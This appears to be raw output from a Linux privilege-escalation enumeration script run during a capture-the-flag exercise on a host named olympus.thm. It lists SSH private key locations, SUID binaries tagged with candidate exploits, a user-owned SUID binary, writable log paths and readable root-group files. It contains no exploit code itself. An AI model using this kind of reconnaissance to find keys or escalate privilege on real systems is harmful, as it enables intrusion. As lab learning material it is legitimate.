 [ - ]  lvm2-lvmpolld
 [ + ]  mysql
 [ - ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
You can't write on systemd PATH so I'm not going to list relative paths executed by services

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
Wed 2025-06-18 14:39:00 UTC 20min left    Wed 2025-06-18 14:09:18 UTC 9min ago             phpsessionclean.timer        phpsessionclean.service       
Wed 2025-06-18 16:44:12 UTC 2h 25min left Sun 2025-04-27 06:20:03 UTC 1 months 21 days ago fwupd-refresh.timer          fwupd-refresh.service         
Wed 2025-06-18 18:38:25 UTC 4h 19min left Sun 2025-04-27 06:14:45 UTC 1 months 21 days ago apt-daily.timer              apt-daily.service             
Wed 2025-06-18 21:55:04 UTC 7h left       Sun 2025-04-27 06:20:36 UTC 1 months 21 days ago motd-news.timer              motd-news.service             
Thu 2025-06-19 00:00:00 UTC 9h left       Wed 2025-06-18 12:49:26 UTC 1h 29min ago         logrotate.timer              logrotate.service             
Thu 2025-06-19 00:00:00 UTC 9h left       Wed 2025-06-18 12:49:26 UTC 1h 29min ago         man-db.timer                 man-db.service                
Thu 2025-06-19 06:04:41 UTC 15h left      Wed 2025-06-18 13:22:41 UTC 56min ago            apt-daily-upgrade.timer      apt-daily-upgrade.service     
Thu 2025-06-19 13:03:35 UTC 22h left      Wed 2025-06-18 13:03:35 UTC 1h 15min ago         systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2025-06-22 03:10:00 UTC 3 days left   Wed 2025-06-18 12:49:26 UTC 1h 29min ago         e2scrub_all.timer            e2scrub_all.service           
Mon 2025-06-23 00:00:00 UTC 4 days left   Wed 2025-06-18 12:49:26 UTC 1h 29min ago         fstrim.timer                 fstrim.service                
n/a                         n/a           n/a                         n/a                  snapd.snap-repair.timer      snapd.snap-repair.service     
n/a                         n/a           n/a                         n/a                  ua-timer.timer               ua-timer.service              

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
Socket /run/user/1000/snapd-session-agent.socket owned by zeus uses HTTP. Response to /index:
{"type":"error","result":{"message":"method \"GET\" not allowed"}}
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)


...



























org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd             - -               -                (activatable) -                           -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          710 systemd-logind  root             :1.7          systemd-logind.service      -       -
org.freedesktop.network1        626 systemd-network systemd-network  :1.1          systemd-networkd.service    -       -
org.freedesktop.resolve1        628 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.3          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1       544 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service   -       -


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
ip-10-10-31-236
127.0.0.1 localhost
127.0.1.1 olympus
127.0.0.1 olympus.thm
127.0.0.1 chat.olympus.thm

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search eu-west-1.compute.internal
eu-west-1.compute.internal

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found
...
[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
/etc/ldap
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
/home/zeus/id_rsa
/home/zeus/.ssh/authorized_keys
/home/zeus/.ssh/id_rsa
/home/zeus/.ssh/id_rsa.pub
/home/zeus/.ssh/known_hosts
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
Possible private SSH keys were found!
/home/zeus/.ssh/id_rsa
/home/zeus/id_rsa
  --> Some certificates were found (out limited):
/var/lib/fwupd/pki/client.pem
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/home/zeus/.sudo_as_admin_successful
/usr/lib/crda/pubkeys/benh@debian.org.key.pub.pem

 --> /etc/hosts.allow file found, read the rules:



Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
krb5.conf Not Found
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
kibana.yml Not Found

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
 Not Found

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
No Sockets found in /run/screen/S-zeus.

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file
Found readable /etc/cloud/cloud.cfg
    lock_passwd: True
    groups: [adm, audio, cdrom, dialout, dip, floppy, lxd, netdev, plugdev, sudo, video]
    sudo: ["ALL=(ALL) NOPASSWD:ALL"]

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files


+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
You own the SUID file: /usr/bin/cputils
/usr/bin/sudo		--->	/sudo$
/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/gpasswd
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
/usr/bin/su
/usr/bin/chfn		--->	SuSE_9.3/10
/usr/bin/chsh
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/fusermount
/usr/bin/umount		--->	BSD/Linux(08-1996)
/usr/bin/newgrp		--->	HP-UX_10.20
/snap/snapd/23771/usr/lib/snapd/snap-confine
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/core20/2571/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core20/2571/usr/bin/chsh
/snap/core20/2571/usr/bin/gpasswd
/snap/core20/2571/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core20/2571/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core20/2571/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core20/2571/usr/bin/su
/snap/core20/2571/usr/bin/sudo		--->	/sudo$
/snap/core20/2571/usr/bin/umount		--->	BSD/Linux(08-1996)
/snap/core20/2571/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2571/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core20/1518/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core20/1518/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo		--->	/sudo$
/snap/core20/1518/usr/bin/umount		--->	BSD/Linux(08-1996)
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign

+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/ssh-agent
/usr/bin/chage
/usr/bin/expiry
/snap/core20/2571/usr/bin/chage
/snap/core20/2571/usr/bin/expiry
/snap/core20/2571/usr/bin/ssh-agent
/snap/core20/2571/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2571/usr/sbin/unix_chkpwd
/snap/core20/1518/usr/bin/chage
/snap/core20/1518/usr/bin/expiry
/snap/core20/1518/usr/bin/ssh-agent
/snap/core20/1518/usr/bin/wall
/snap/core20/1518/usr/sbin/pam_extrausers_chkpwd
/snap/core20/1518/usr/sbin/unix_chkpwd

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
/usr/local/lib
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/snap/core20/2571/usr/bin/ping = cap_net_raw+ep
/snap/core20/1518/usr/bin/ping = cap_net_raw+ep

[+] Users with capabilities

[+] Files with ACLs
files with acls in searched folders Not Found

[+] .sh files in path
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh

[+] Unexpected folders in root

[+] Files (scripts) in /etc/profile.d/
total 44
drwxr-xr-x   2 root root 4096 May 11 16:13 .
drwxr-xr-x 110 root root 4096 Jun 18 12:49 ..
-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root  835 Feb 18  2022 apps-bin-path.sh
-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x   1 root root  841 Mar 13 16:28 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root 3396 Mar 13 16:28 Z99-cloud-locale-test.sh

[+] Hashes inside passwd file? ........... No
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 20)
/home
/home/zeus/.bash_history

[+] Searching others files in folders owned by me

[+] Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 0 May  1  2022 /var/log/apport.log
-rw-r----- 1 root adm 28403 Jun 18 12:51 /var/log/cloud-init-output.log
-rw-r----- 1 root adm 20 May  1  2022 /var/log/apache2/error.log.6.gz
-rw-r----- 1 root adm 582 May 11 16:07 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 336 Apr 27 06:38 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 1310 Jul 16  2022 /var/log/apache2/access.log.1
-rw-r----- 1 root adm 0 May  1  2022 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 696 Jul 16  2022 /var/log/apache2/error.log.3.gz
-rw-r----- 1 root adm 14398 Jun 18 13:20 /var/log/apache2/error.log
-rw-r----- 1 root adm 4324 Jul 15  2022 /var/log/apache2/access.log.2.gz
-rw-r----- 1 root adm 1290 Jul 15  2022 /var/log/apache2/error.log.4.gz
-rw-r----- 1 root adm 251 May  1  2022 /var/log/apache2/error.log.5.gz
-rw-r----- 1 root adm 53703 Jun 18 13:57 /var/log/apache2/access.log
-rw-r----- 1 root adm 20 May  1  2022 /var/log/apache2/access.log.3.gz
-rw-r----- 1 root adm 652 May 11 16:13 /var/log/apt/term.log.1.gz
-rw-r----- 1 root adm 801 Jul 15  2022 /var/log/apt/term.log.3.gz
-rw-r----- 1 root adm 0 Jun 18 12:49 /var/log/apt/term.log
-rw-r----- 1 root adm 13722 Apr 27 06:34 /var/log/apt/term.log.2.gz
-rw-r----- 1 root adm 0 May  1  2022 /var/log/installer/subiquity-client-debug.log.2258
-rw-r----- 1 root adm 2188 Mar 22  2022 /var/log/installer/autoinstall-user-data
-rw-r----- 1 root adm 0 May  1  2022 /var/log/installer/subiquity-server-debug.log.2304
-rw-r----- 1 root adm 285 Mar 22  2022 /var/log/installer/subiquity-curtin-apt.conf
-rw-r----- 1 root adm 0 May  1  2022 /var/log/installer/subiquity-server-info.log.2304
-rw-r----- 1 root adm 2946 Mar 22  2022 /var/log/installer/subiquity-curtin-install.conf
-rw-r----- 1 root adm 0 May  1  2022 /var/log/installer/subiquity-client-info.log.2258
-rw-r----- 1 root adm 709520 Mar 22  2022 /var/log/installer/installer-journal.txt
-rw-r----- 1 root adm 0 May  1  2022 /var/log/apport.log.1

[+] Modified interesting files in the last 5mins (limit 100)
/tmp/report
/home/zeus/.gnupg/crls.d/DIR.txt
/var/log/kern.log
/var/log/journal/2e6fb665155b4633af31afe0aa376873/user-1000.journal
/var/log/journal/2e6fb665155b4633af31afe0aa376873/system.journal
/var/log/syslog
/var/log/auth.log

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory

[+] Files inside /home/zeus (limit 20)
total 160
drwxr-xr-x 7 zeus zeus      4096 Jun 18 13:51 .
drwxr-xr-x 4 root root      4096 Jun 18 12:49 ..
-rw-rw-r-- 1 zeus zeus     49333 Jun 18 13:49 a
lrwxrwxrwx 1 root root         9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 zeus zeus       220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zeus zeus      3771 Feb 25  2020 .bashrc
drwx------ 2 zeus zeus      4096 Mar 22  2022 .cache
drwx------ 4 zeus zeus      4096 Jun 18 14:19 .gnupg
-r-------- 1 zeus www-data  2655 Jun 18 13:26 id_rsa
-rw------- 1 zeus zeus        28 Jun 18 13:51 .lesshst
drwxrwxr-x 3 zeus zeus      4096 Mar 23  2022 .local
-rw-r--r-- 1 zeus zeus       807 Feb 25  2020 .profile
drwx------ 3 zeus zeus      4096 Apr 14  2022 snap
drwx------ 2 zeus zeus      4096 Jun 18 13:41 .ssh
-rw-r--r-- 1 zeus zeus         0 Mar 22  2022 .sudo_as_admin_successful
-rw-rw-r-- 1 zeus zeus        34 Mar 23  2022 user.flag
-rw-r--r-- 1 zeus zeus     49333 Jun 18 13:51 z3deGv8TttR4sc
-r--r--r-- 1 zeus zeus       199 Apr 15  2022 zeus.txt

[+] Files inside others home (limit 20)
/home/ubuntu/.bash_logout
/home/ubuntu/.bashrc
/home/ubuntu/.profile

[+] Searching installed mail applications

[+] Mails (limit 50)

[+] Backup files?
-rwxr-xr-x 1 root root 10988 Apr 18  2022 /var/www/html/index.html.old
-rw-r--r-- 1 root root 2743 Feb 23  2022 /etc/apt/sources.list.curtin.old

[+] Searching tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)

 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)

 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)


[+] Web files?(output limit)
/var/www/:
total 20K
drwxr-xr-x  5 root     root     4.0K Mar 22  2022 .
drwxr-xr-x 14 root     root     4.0K Mar 22  2022 ..
drwxr-xr-x  3 www-data www-data 4.0K Mar 22  2022 chat.olympus.thm
drwxr-xr-x  3 www-data www-data 4.0K May  1  2022 html
drwxr-xr-x  3 www-data www-data 4.0K Mar 23  2022 olympus.thm

/var/www/chat.olympus.thm:
total 16K

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2319 Feb 25  2020 /etc/bash.bashrc
-rw-r--r-- 1 root root 273 Mar 31  2020 /etc/phpmyadmin/lighttpd.conf
Reading /etc/phpmyadmin/lighttpd.conf
alias.url += (
	"/phpmyadmin" => "/usr/share/phpmyadmin",
)
$HTTP["url"] =~ "^/phpmyadmin/templates" {
    url.access-deny = ( "" )
}
$HTTP["url"] =~ "^/phpmyadmin/libraries" {
    url.access-deny = ( "" )
}

-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
lrwxrwxrwx 1 root root 46 Feb 23  2022 /etc/systemd/user/sockets.target.wants/pk-debconf-helper.socket -> /usr/lib/systemd/user/pk-debconf-helper.socket
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 /home/ubuntu/.bashrc
-rw-r--r-- 1 ubuntu ubuntu 807 Feb 25  2020 /home/ubuntu/.profile
lrwxrwxrwx 1 root root 9 Mar 23  2022 /home/zeus/.bash_history -> /dev/null
Searching possible passwords inside /home/zeus/.bash_history (limit 100)

-rw-r--r-- 1 zeus zeus 3771 Feb 25  2020 /home/zeus/.bashrc
-rw-r--r-- 1 zeus zeus 807 Feb 25  2020 /home/zeus/.profile
-rw-r--r-- 1 zeus zeus 0 Mar 22  2022 /home/zeus/.sudo_as_admin_successful
-rw-r--r-- 1 root root 451 Feb  5  2018 /usr/lib/crda/pubkeys/benh@debian.org.key.pub.pem
-rw-r--r-- 1 root root 3106 Jan  2  2024 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2978 Feb 17  2020 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 2778 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 ubuntu ubuntu 220 Feb 25  2020 /home/ubuntu/.bash_logout
-rw------- 1 zeus zeus 28 Jun 18 13:51 /home/zeus/.lesshst
-rw-r--r-- 1 zeus zeus 220 Feb 25  2020 /home/zeus/.bash_logout
-rw-r--r-- 1 root root 17256 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/kernel/.bounds.s.cmd
-rw-r--r-- 1 root root 11340 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.special.o.cmd
-rw-r--r-- 1 root root 6649 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.libstring.o.cmd
-rw-r--r-- 1 root root 6267 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.sigchain.o.cmd
-rw-r--r-- 1 root root 10274 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.builtin-check.o.cmd
-rw-r--r-- 1 root root 4412 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.libctype.o.cmd
-rw-r--r-- 1 root root 5408 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.fixdep.o.cmd
-rw-r--r-- 1 root root 5144 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.librbtree.o.cmd
-rw-r--r-- 1 root root 4427 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.fixdep.o.d
-rw-r--r-- 1 root root 11350 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.elf.o.cmd
-rw-r--r-- 1 root root 1445 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.libsubcmd-in.o.cmd
-rw-r--r-- 1 root root 9569 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.weak.o.cmd
-rw-r--r-- 1 root root 6848 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.parse-options.o.cmd
-rw-r--r-- 1 root root 7222 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.pager.o.cmd
-rw-r--r-- 1 root root 2543 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.objtool-in.o.cmd
-rw-r--r-- 1 root root 11869 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.check.o.cmd
-rw-r--r-- 1 root root 7267 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.exec-cmd.o.cmd
-rw-r--r-- 1 root root 11314 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.orc_gen.o.cmd
-rw-r--r-- 1 root root 2177 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.subcmd-config.o.cmd
-rw-r--r-- 1 root root 8183 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.help.o.cmd
-rw-r--r-- 1 root root 489 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.fixdep-in.o.cmd
-rw-r--r-- 1 root root 11335 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.orc_dump.o.cmd
-rw-r--r-- 1 root root 5083 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.str_error_r.o.cmd
-rw-r--r-- 1 root root 12948 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/arch/x86/.decode.o.cmd
-rw-r--r-- 1 root root 10364 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/arch/x86/.special.o.cmd
-rw-r--r-- 1 root root 683 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/arch/x86/.objtool-in.o.cmd
-rw-r--r-- 1 root root 9836 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.builtin-orc.o.cmd
-rw-r--r-- 1 root root 11115 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.objtool.o.cmd
-rw-r--r-- 1 root root 8743 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/objtool/.run-command.o.cmd
-rw-r--r-- 1 root root 1370 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/.resolve_btfids-in.o.cmd
-rw-r--r-- 1 root root 5474 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/.fixdep.o.cmd
-rw-r--r-- 1 root root 4438 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/.fixdep.o.d
-rw-r--r-- 1 root root 4094 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/.zalloc.o.cmd
-rw-r--r-- 1 root root 9611 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.btf.o.cmd
-rw-r--r-- 1 root root 9417 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.netlink.o.cmd
-rw-r--r-- 1 root root 7374 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.bpf_prog_linfo.o.cmd
-rw-r--r-- 1 root root 5727 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.relo_core.o.d
-rw-r--r-- 1 root root 10297 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.xsk.o.cmd
-rw-r--r-- 1 root root 7581 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.btf_dump.o.cmd
-rw-r--r-- 1 root root 7360 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf_errno.o.cmd
-rw-r--r-- 1 root root 6649 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.gen_loader.o.d
-rw-r--r-- 1 root root 8308 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.gen_loader.o.cmd
-rw-r--r-- 1 root root 7857 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.nlattr.o.cmd
-rw-r--r-- 1 root root 6218 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.nlattr.o.d
-rw-r--r-- 1 root root 6382 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.linker.o.d
-rw-r--r-- 1 root root 3336 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.str_error.o.cmd
-rw-r--r-- 1 root root 5695 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.bpf_prog_linfo.o.d
-rw-r--r-- 1 root root 5691 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf_errno.o.d
-rw-r--r-- 1 root root 5704 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.strset.o.d
-rw-r--r-- 1 root root 7381 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.relo_core.o.cmd
-rw-r--r-- 1 root root 6818 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.ringbuf.o.d
-rw-r--r-- 1 root root 6715 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.hashmap.o.cmd
-rw-r--r-- 1 root root 5932 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.btf_dump.o.d
